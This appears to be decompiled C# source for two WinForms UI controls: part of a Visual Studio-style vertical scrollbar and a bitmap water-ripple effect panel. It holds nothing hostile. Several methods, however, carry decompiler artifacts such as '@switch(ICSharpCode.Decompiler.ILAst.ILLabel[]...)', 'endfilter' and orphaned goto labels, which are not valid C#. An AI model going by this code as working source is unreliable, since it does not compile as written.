		protected override void OnMouseUp(MouseEventArgs e)
		{
			bool flag = this.Thumb.Contains(e.Location);
			if (flag)
			{
				this._ThumbState = MouseState.Over;
			}
			else
			{
				flag = !this.Thumb.Contains(e.Location);
				if (flag)
				{
					this._ThumbState = MouseState.None;
				}
			}
			checked
			{
				flag = (e.Location.Y < 16 | e.Location.Y > this.Width - 16);
				if (flag)
				{
					this._ThumbState = MouseState.Over;
				}
				else
				{
					flag = (e.Location.Y >= 16 | e.Location.Y > this.Width - 16);
					if (flag)
					{
						this._ThumbState = MouseState.None;
					}
				}
				this.Invalidate();
			}
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			this._ThumbState = MouseState.None;
			this._ArrowState = MouseState.None;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.Invalidate();
		}

		public VisualStudioVerticalScrollBar()
		{
			VisualStudioVerticalScrollBar.__ENCAddToList(this);
			this._BaseColour = Color.FromArgb(62, 62, 66);
			this._ThumbNormalColour = Color.FromArgb(104, 104, 104);
			this._ThumbHoverColour = Color.FromArgb(158, 158, 158);
			this._ThumbPressedColour = Color.FromArgb(239, 235, 239);
			this._ArrowNormalColour = Color.FromArgb(153, 153, 153);
			this._ArrowHoveerColour = Color.FromArgb(39, 123, 181);
			this._ArrowPressedColour = Color.FromArgb(0, 113, 171);
			this._Minimum = 0;
			this._Maximum = 100;
			this._Value = 0;
			this._SmallChange = 1;
			this._ButtonSize = 16;
			this._LargeChange = 10;
			this._ShowOuterBorder = false;
			this._ShowThumbBorder = false;
			this._AmountOfInnerLines = VisualStudioVerticalScrollBar.__InnerLineCount.None;
			this._MousePos = new Point(this._MouseXLoc, this._MouseYLoc);
			this._ThumbState = MouseState.None;
			this._ArrowState = MouseState.None;
			this._ThumbSize = 24;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(19, 50);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.AntiAlias;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this._BaseColour);
			Point[] array = new Point[3];
			Point[] arg_66_0_cp_0 = array;
			int arg_66_0_cp_1 = 0;
			checked
			{
				Point point = new Point((int)Math.Round((double)this.Width / 2.0), 5);
				arg_66_0_cp_0[arg_66_0_cp_1] = point;
				Point[] arg_96_0_cp_0 = array;
				int arg_96_0_cp_1 = 1;
				Point point2 = new Point((int)Math.Round((double)this.Width / 4.0), 11);
				arg_96_0_cp_0[arg_96_0_cp_1] = point2;
				Point[] arg_D8_0_cp_0 = array;
				int arg_D8_0_cp_1 = 2;
				Point point3 = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 + (double)this.Width / 4.0)), 11);
				arg_D8_0_cp_0[arg_D8_0_cp_1] = point3;
				Point[] points = array;
				array = new Point[3];
				Point[] arg_119_0_cp_0 = array;
				int arg_119_0_cp_1 = 0;
				point3 = new Point((int)Math.Round((double)this.Width / 2.0), this.Height - 5);
				arg_119_0_cp_0[arg_119_0_cp_1] = point3;
				Point[] arg_150_0_cp_0 = array;
				int arg_150_0_cp_1 = 1;
				point2 = new Point((int)Math.Round((double)this.Width / 4.0), this.Height - 11);
				arg_150_0_cp_0[arg_150_0_cp_1] = point2;
				Point[] arg_199_0_cp_0 = array;
				int arg_199_0_cp_1 = 2;
				point = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 + (double)this.Width / 4.0)), this.Height - 11);
				arg_199_0_cp_0[arg_199_0_cp_1] = point;
				Point[] points2 = array;
				switch (this._ThumbState)
				{
				case MouseState.None:
				{
					SolidBrush solidBrush = new SolidBrush(this._ThumbNormalColour);
					try
					{
						graphics2.FillRectangle(solidBrush, this.Thumb);
					}
					finally
					{
						bool flag = solidBrush != null;
						if (flag)
						{
							((IDisposable)solidBrush).Dispose();
						}
					}
					break;
				}
				case MouseState.Over:
				{
					SolidBrush solidBrush2 = new SolidBrush(this._ThumbHoverColour);
					try
					{
						graphics2.FillRectangle(solidBrush2, this.Thumb);
					}
					finally
					{
						bool flag = solidBrush2 != null;
						if (flag)
						{
							((IDisposable)solidBrush2).Dispose();
						}
					}
					break;
				}
				case MouseState.Down:
				{
					SolidBrush solidBrush3 = new SolidBrush(this._ThumbPressedColour);
					try
					{
						graphics2.FillRectangle(solidBrush3, this.Thumb);
					}
					finally
					{
						bool flag = solidBrush3 != null;
						if (flag)
						{
							((IDisposable)solidBrush3).Dispose();
						}
					}
					break;
				}
				}
				switch (this._ArrowState)
				{
				case MouseState.None:
					graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
					graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
					break;
				case MouseState.Over:
				{
					bool flag = this._MouseYLoc < 16;
					if (flag)
					{
						graphics2.FillPolygon(new SolidBrush(this._ArrowHoveerColour), points);
						graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
					}
					else
					{
						flag = (this._MouseXLoc > this.Width - 16);
						if (flag)
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowHoveerColour), points2);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
						}
						else
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
						}
					}
					break;
				}
				case MouseState.Down:
				{
					bool flag = !this.Thumb.Contains(this._MousePos);
					if (flag)
					{
						SolidBrush solidBrush4 = new SolidBrush(this._ThumbNormalColour);
						try
						{
							graphics2.FillRectangle(solidBrush4, this.Thumb);
						}
						finally
						{
							flag = (solidBrush4 != null);
							if (flag)
							{
								((IDisposable)solidBrush4).Dispose();
							}
						}
					}
					flag = (this._MouseYLoc < 16);
					if (flag)
					{
						graphics2.FillPolygon(new SolidBrush(this._ArrowPressedColour), points);
						graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
					}
					else
					{
						flag = (this._MouseXLoc > this.Width - 16);
						if (flag)
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowPressedColour), points2);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
						}
						else
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
						}
					}
					break;
				}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics2 = null;
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace nj
{
	public class WaterFX : Panel
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Timer effectTimer;

		private Timer tmrBalance;

		private IContainer components;

		private Bitmap _bmp;

		private short[,,] _waves;

		private int _waveWidth;

		private int _waveHeight;

		private int _activeBuffer;

		private bool _weHaveWaves;

		private int _bmpHeight;

		private int _bmpWidth;

		private byte[] _bmpBytes;

		private BitmapData _bmpBitmapData;

		private int _scale;

		private bool __IsBusy;

		public Bitmap ImageBitmap
		{
			get
			{
				return this._bmp;
			}
			set
			{
				this._bmp = value;
				bool flag = Information.IsNothing(this._bmp);
				checked
				{
					if (flag)
					{
						this.effectTimer.Stop();
						this.tmrBalance.Stop();
					}
					else
					{
						this.effectTimer.Start();
						this.__IsBusy = false;
						this._bmpHeight = this._bmp.Height;
						this._bmpWidth = this._bmp.Width;
						this._waveWidth = this._bmpWidth >> this._scale;
						this._waveHeight = this._bmpHeight >> this._scale;
						this._waves = new short[this._waveWidth - 1 + 1, this._waveHeight - 1 + 1, 2];
						this._bmpBytes = new byte[this._bmpWidth * this._bmpHeight * 4 - 1 + 1];
						Bitmap arg_FC_0 = this._bmp;
						Rectangle rect = new Rectangle(0, 0, this._bmpWidth, this._bmpHeight);
						this._bmpBitmapData = arg_FC_0.LockBits(rect, ImageLockMode.ReadWrite, PixelFormat.Format32bppArgb);
						Marshal.Copy(this._bmpBitmapData.Scan0, this._bmpBytes, 0, this._bmpWidth * this._bmpHeight * 4);
					}
				}
			}
		}

		public new int Scale
		{
			get
			{
				return this._scale;
			}
			set
			{
				this._scale = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = WaterFX.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = WaterFX.__ENCList.Count == WaterFX.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = WaterFX.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = WaterFX.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									WaterFX.__ENCList[num] = WaterFX.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						WaterFX.__ENCList.RemoveRange(num, WaterFX.__ENCList.Count - num);
						WaterFX.__ENCList.Capacity = WaterFX.__ENCList.Count;
					}
					WaterFX.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		private void InitializeComponent()
		{
			this.components = new Container();
			this.effectTimer = new Timer(this.components);
			this.tmrBalance = new Timer(this.components);
			this.effectTimer.Tick += new EventHandler(this.effectTimer_Tick);
			this.tmrBalance.Tick += new EventHandler(this.tmrBalance_Tick);
			this.Paint += new PaintEventHandler(this.WaterEffectControl_Paint);
			this.MouseMove += new MouseEventHandler(this.WaterEffectControl_MouseMove);
		}

		public WaterFX()
		{
			WaterFX.__ENCAddToList(this);
			this._activeBuffer = 0;
			this.InitializeComponent();
			this.effectTimer.Enabled = true;
			this.effectTimer.Interval = 100;
			this.tmrBalance.Interval = 1000;
			this.SetStyle(ControlStyles.UserPaint, true);
			this.SetStyle(ControlStyles.AllPaintingInWmPaint, true);
			this.SetStyle(ControlStyles.DoubleBuffer, true);
			this.BackColor = Color.Transparent;
			this._weHaveWaves = false;
			this._scale = 1;
		}

		public WaterFX(Bitmap bmp) : this()
		{
			this.ImageBitmap = bmp;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing)
			{
				bool flag = this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			base.Dispose(disposing);
		}

		private void effectTimer_Tick(object sender, EventArgs e)
		{
			bool weHaveWaves = this._weHaveWaves;
			if (weHaveWaves)
			{
				this.Invalidate();
				this.ProcessWaves();
			}
		}

		private void tmrBalance_Tick(object sender, EventArgs e)
		{
			this.__IsBusy = !this.__IsBusy;
		}

		public void WaterEffectControl_Paint(object sender, PaintEventArgs e)
		{
			int num2;
			int num12;
			try
			{
				IL_01:
				int num = 1;
				bool flag = Information.IsNothing(this._bmp);
				if (!flag)
				{
					goto IL_1B;
				}
				IL_15:
				goto IL_62C;
				IL_1B:
				num = 4;
				Bitmap bitmap = null;
				IL_20:
				ProjectData.ClearProjectError();
				num2 = -2;
				IL_29:
				num = 6;
				bitmap = (Bitmap)this._bmp.Clone();
				IL_3D:
				num = 7;
				flag = this._weHaveWaves;
				if (!flag)
				{
					goto IL_422;
				}
				IL_4F:
				num = 8;
				Bitmap arg_71_0 = bitmap;
				Rectangle rect = new Rectangle(0, 0, this._bmpWidth, this._bmpHeight);
				BitmapData bitmapData = arg_71_0.LockBits(rect, ImageLockMode.ReadWrite, PixelFormat.Format32bppArgb);
				IL_78:
				num = 9;
				checked
				{
					byte[] array = new byte[this._bmpWidth * this._bmpHeight * 4 - 1 + 1];
					IL_96:
					num = 10;
					Marshal.Copy(bitmapData.Scan0, array, 0, this._bmpWidth * this._bmpHeight * 4);
					IL_B9:
					num = 11;
					int arg_C8_0 = 1;
					int num3 = this._bmpWidth - 2;
					int num4 = arg_C8_0;
					bool flag2;
					while (true)
					{
						int arg_3ED_0 = num4;
						int num5 = num3;
						if (arg_3ED_0 > num5)
						{
							break;
						}
						IL_CF:
						num = 12;
						int arg_DE_0 = 1;
						int num6 = this._bmpHeight - 2;
						int num7 = arg_DE_0;
						while (true)
						{
							int arg_3B8_0 = num7;
							num5 = num6;
							if (arg_3B8_0 > num5)
							{
								break;
							}
							IL_E5:
							num = 13;
							int num8 = num4 >> this._scale;
							IL_F7:
							num = 14;
							int num9 = num7 >> this._scale;
							IL_109:
							num = 15;
							flag = (num8 <= 0);
							if (flag)
							{
								IL_11B:
								num = 16;
								num8 = 1;
							}
							IL_122:
							IL_123:
							num = 18;
							flag = (num9 <= 0);
							if (flag)
							{
								IL_135:
								num = 19;
								num9 = 1;
							}
							IL_13C:
							IL_13D:
							num = 21;
							flag = (num8 >= this._waveWidth - 1);
							if (flag)
							{
								IL_156:
								num = 22;
								num8 = this._waveWidth - 2;
							}
							IL_164:
							IL_165:
							num = 24;
							flag = (num9 >= this._waveHeight - 1);
							if (flag)
							{
								IL_17E:
								num = 25;
								num9 = this._waveHeight - 2;
							}
							IL_18C:
							IL_18D:
							num = 27;
							int num10;
							int num11;
							unchecked
							{
								num10 = (int)((short)(this._waves[checked(num8 - 1), num9, this._activeBuffer] - this._waves[checked(num8 + 1), num9, this._activeBuffer] >> 3));
								IL_1C5:
								num = 28;
								num11 = (int)((short)(this._waves[num8, checked(num9 - 1), this._activeBuffer] - this._waves[num8, checked(num9 + 1), this._activeBuffer] >> 3));
								IL_1FD:
								num = 29;
								flag = (num10 != 0 || num11 != 0);
							}
							if (flag)
							{
								IL_216:
								num = 30;
								flag2 = (num4 + num10 >= this._bmpWidth - 1);
								if (flag2)
								{
									IL_231:
									num = 31;
									num10 = this._bmpWidth - num4 - 1;
								}
								IL_241:
								IL_242:
								num = 33;
								flag2 = (num7 + num11 >= this._bmpHeight - 1);
								if (flag2)
								{
									IL_25D:
									num = 34;
									num11 = this._bmpHeight - num7 - 1;
								}
								IL_26D:
								IL_26E:
								num = 36;
								flag2 = (num4 + num10 < 0);
								if (flag2)
								{
									IL_27F:
									num = 37;
									num10 = 0 - num4;
								}
								IL_288:
								IL_289:
								num = 39;
								flag2 = (num7 + num11 < 0);
								if (flag2)
								{
									IL_29A:
									num = 40;
									num11 = 0 - num7;
								}
								IL_2A3:
								IL_2A4:
								num = 42;
								flag2 = (num10 <= 0);
								if (flag2)
								{
									IL_2B5:
									num = 43;
									num10 = 0;
								}
								IL_2BB:
								num = 45;
								byte b = (byte)(200 - num10);
								IL_2C8:
								num = 46;
								flag2 = (b < 0);
								if (flag2)
								{
									IL_2D6:
									num = 47;
									b = 0;
								}
								IL_2DC:
								IL_2DD:
								num = 49;
								flag2 = (b > 255);
								if (flag2)
								{
									IL_2EF:
									num = 50;
									b = 254;
								}
								IL_2F9:
								IL_2FA:
								num = 52;
								array[4 * (num4 + num7 * this._bmpWidth)] = this._bmpBytes[4 * (num4 + num10 + (num7 + num11) * this._bmpWidth)];
								IL_328:
								num = 53;
								array[4 * (num4 + num7 * this._bmpWidth) + 1] = this._bmpBytes[4 * (num4 + num10 + (num7 + num11) * this._bmpWidth) + 1];
								IL_35A:
								num = 54;
								array[4 * (num4 + num7 * this._bmpWidth) + 2] = this._bmpBytes[4 * (num4 + num10 + (num7 + num11) * this._bmpWidth) + 2];
								IL_38C:
								num = 55;
								array[4 * (num4 + num7 * this._bmpWidth) + 3] = b;
							}
							IL_3A4:
							IL_3A5:
							num = 57;
							num7++;
						}
						IL_3BD:
						num = 58;
						flag2 = (Information.Err().Number != 0);
						if (flag2)
						{
							break;
						}
						IL_3DA:
						num = 61;
						num4++;
					}
					IL_3D8:
					IL_3F2:
					num = 62;
					Marshal.Copy(array, 0, bitmapData.Scan0, this._bmpWidth * this._bmpHeight * 4);
					IL_415:
					num = 63;
					bitmap.UnlockBits(bitmapData);
					IL_422:
					IL_423:
					num = 65;
					e.Graphics.DrawImage(bitmap, 0, 0, this.ClientRectangle.Width, this.ClientRectangle.Height);
					IL_454:
					num = 66;
					flag2 = (Information.Err().Number != 0);
					if (!flag2)
					{
						goto IL_48C;
					}
					IL_46E:
					num = 67;
					Debug.WriteLine("WaterEffectControl_Paint: " + Information.Err().Description);
					IL_48C:
					num = 69;
					flag2 = !Information.IsNothing(bitmap);
					if (!flag2)
					{
						goto IL_4AA;
					}
					IL_49F:
					num = 70;
					bitmap.Dispose();
					IL_4AA:
					goto IL_62C;
					IL_4B3:;
				}
				int arg_4BA_0 = num12 + 1;
				num12 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_4BA_0);
				IL_5DF:
				goto IL_621;
				num12 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num2 > -2) ? num2 : 1);
				IL_5FD:
				goto IL_621;
			}
			object arg_5FF_0;
			endfilter(arg_5FF_0 is Exception & num2 != 0 & num12 == 0);
			IL_621:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_62C:
			if (num12 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void ProcessWaves()
		{
			int num3;
			int num12;
			try
			{
				IL_01:
				int num = 1;
				int num2 = (this._activeBuffer == 0) ? 1 : 0;
				IL_12:
				num = 2;
				bool weHaveWaves = false;
				IL_17:
				num = 3;
				bool flag = num2 < 0;
				if (!flag)
				{
					goto IL_29;
				}
				IL_24:
				num = 4;
				num2 = 1;
				IL_29:
				ProjectData.ClearProjectError();
				num3 = -2;
				IL_32:
				num = 7;
				int arg_40_0 = 1;
				checked
				{
					int num4 = this._waveWidth - 2;
					int num5 = arg_40_0;
					while (true)
					{
						int arg_203_0 = num5;
						int num6 = num4;
						if (arg_203_0 > num6)
						{
							break;
						}
						IL_46:
						num = 8;
						int arg_54_0 = 1;
						int num7 = this._waveHeight - 2;
						int num8 = arg_54_0;
						while (true)
						{
							int arg_1D1_0 = num8;
							num6 = num7;
							if (arg_1D1_0 > num6)
							{
								break;
							}
							IL_5A:
							num = 9;
							unchecked
							{
								this._waves[num5, num8, num2] = (short)(checked(this._waves[num5 - 1, num8 - 1, this._activeBuffer]) + this._waves[num5, checked(num8 - 1), this._activeBuffer] + checked(this._waves[num5 + 1, num8 - 1, this._activeBuffer]) + this._waves[checked(num5 - 1), num8, this._activeBuffer] + this._waves[checked(num5 + 1), num8, this._activeBuffer] + checked(this._waves[num5 - 1, num8 + 1, this._activeBuffer]) + this._waves[num5, checked(num8 + 1), this._activeBuffer] + checked(this._waves[num5 + 1, num8 + 1, this._activeBuffer]) >> 2) - this._waves[num5, num8, num2];
								IL_13D:
								num = 10;
								flag = (this._waves[num5, num8, num2] != 0);
								if (flag)
								{
									IL_15B:
									num = 11;
									short[,,] waves = this._waves;
									short[,,] arg_198_0 = waves;
									int num9 = num5;
									int arg_198_1 = num9;
									int num10 = num8;
									int arg_198_2 = num10;
									int num11 = num2;
									arg_198_0[arg_198_1, arg_198_2, num11] = waves[num9, num10, num11] - (short)(this._waves[num5, num8, num2] >> 4);
									IL_19D:
									num = 12;
									weHaveWaves = true;
								}
								IL_1A3:
								IL_1A4:
								num = 14;
								flag = (Information.Err().Number != 0);
								if (flag)
								{
									break;
								}
								IL_1C1:
								num = 17;
							}
							num8++;
						}
						IL_1D6:
						num = 18;
						flag = (Information.Err().Number != 0);
						if (flag)
						{
							break;
						}
						IL_1F3:
						num = 21;
						num5++;
						continue;
						IL_1BF:
						goto IL_1D6;
					}
					IL_1F1:
					IL_208:
					num = 22;
					this._weHaveWaves = weHaveWaves;
					IL_213:
					num = 23;
					this._activeBuffer = num2;
					IL_21E:
					goto IL_2E4;
					IL_227:;
				}
				int arg_22E_0 = num12 + 1;
				num12 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_22E_0);
				IL_297:
				goto IL_2D9;
				num12 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num3 > -2) ? num3 : 1);
				IL_2B5:
				goto IL_2D9;
			}
			object arg_2B7_0;
			endfilter(arg_2B7_0 is Exception & num3 != 0 & num12 == 0);
			IL_2D9:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_2E4:
			if (num12 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void PutDrop(int x, int y, short height)
		{
			int num3;
			int num10;
			try
			{
				IL_01:
				int num = 1;
				this._weHaveWaves = true;
				IL_0B:
				num = 2;
				int num2 = 20;
				IL_11:
				ProjectData.ClearProjectError();
				num3 = -2;
				IL_1A:
				num = 4;
				checked
				{
					int arg_23_0 = 0 - num2;
					int num4 = num2;
					int num5 = arg_23_0;
					while (true)
					{
						int arg_128_0 = num5;
						int num6 = num4;
						if (arg_128_0 > num6)
						{
							break;
						}
						IL_29:
						num = 5;
						int arg_32_0 = 0 - num2;
						int num7 = num2;
						int num8 = arg_32_0;
						bool flag;
						while (true)
						{
							int arg_F3_0 = num8;
							num6 = num7;
							if (arg_F3_0 > num6)
							{
								break;
							}
							IL_38:
							num = 6;
							flag = (x + num5 >= 0 && x + num5 < this._waveWidth - 1 && y + num8 >= 0 && y + num8 < this._waveHeight - 1);
							if (flag)
							{
								IL_6B:
								num = 7;
								double num9 = Math.Sqrt((double)(num5 * num5 + num8 * num8));
								IL_7C:
								num = 8;
								flag = (num9 < (double)num2);
								if (flag)
								{
									IL_8A:
									num = 9;
									this._waves[x + num5, y + num8, this._activeBuffer] = (short)Math.Round(unchecked(Math.Cos(num9 * 3.1415926535897931 / (double)num2) * (double)height));
								}
								IL_C1:;
							}
							IL_C2:
							IL_C3:
							num = 12;
							flag = (Information.Err().Number != 0);
							if (flag)
							{
								goto IL_DD;
							}
							IL_E3:
							num = 15;
							num8++;
						}
						IL_F8:
						num = 16;
						flag = (Information.Err().Number != 0);
						if (flag)
						{
							break;
						}
						IL_118:
						num = 19;
						num5++;
					}
					IL_DD:
					IL_112:
					IL_12D:
					goto IL_1E3;
					IL_136:;
				}
				int arg_13D_0 = num10 + 1;
				num10 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_13D_0);
				IL_196:
				goto IL_1D8;
				num10 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num3 > -2) ? num3 : 1);
				IL_1B4:
				goto IL_1D8;
			}
			object arg_1B6_0;
			endfilter(arg_1B6_0 is Exception & num3 != 0 & num10 == 0);
			IL_1D8:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_1E3:
			if (num10 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void WaterEffectControl_MouseMove(object sender, MouseEventArgs e)
		{
			int num;
			int num3;
			try
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = -2;
				IL_09:
				int num2 = 2;
				bool flag = !this.__IsBusy;
				if (!flag)
				{
					goto IL_A0;
				}
				IL_1E:
				num2 = 3;
				checked
				{
					int x = (int)Math.Round(unchecked((double)e.X / (double)this.ClientRectangle.Width * (double)this._waveWidth));
					IL_47:
					num2 = 4;
					int y = (int)Math.Round(unchecked((double)e.Y / (double)this.ClientRectangle.Height * (double)this._waveHeight));
					IL_70:
					num2 = 5;
					flag = (Information.Err().Number != 0);
					if (!flag)
					{
						goto IL_8F;
					}
					IL_89:
					goto IL_15C;
					IL_8F:
					num2 = 8;
					this.PutDrop(x, y, 200);
					IL_A0:
					IL_A1:
					num2 = 10;
					flag = !this.tmrBalance.Enabled;
					if (!flag)
					{
						goto IL_C9;
					}
					IL_B9:
					num2 = 11;
					this.tmrBalance.Start();
					IL_C9:
					goto IL_15C;
					IL_D2:;
				}
				int arg_D9_0 = num3 + 1;
				num3 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_D9_0);
				IL_112:
				goto IL_151;
				num3 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
				IL_12E:
				goto IL_151;
			}
			object arg_130_0;
			endfilter(arg_130_0 is Exception & num != 0 & num3 == 0);
			IL_151:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_15C:
			if (num3 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}
}
